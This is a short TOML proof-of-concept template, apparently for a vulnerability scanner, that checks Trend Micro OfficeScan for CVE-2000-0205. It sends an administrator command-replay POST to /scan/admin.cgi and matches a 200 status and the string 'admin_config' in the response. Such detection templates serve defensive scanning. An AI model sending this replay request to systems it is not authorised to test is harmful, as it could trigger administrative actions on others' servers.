[info]
author = "ave"
description = "检测 Trend Micro OfficeScan 是否支持管理员命令重播攻击，验证漏洞是否存在"
id = "POC-AVE-2000-0181"
name = "CVE-2000-0205 OfficeScan Command Replay PoC"
severity = "medium"
tags = [
    "cve-2000-0205",
    "ave-2000-0181",
]
vuln_id = [
    "CVE-2000-0205",
    "AVE-2000-0181",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/scan/admin.cgi"
protocol = "http"

[poc.requests.body]
content = "cmd=replay_admin&config=admin_config"
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["admin_config"]
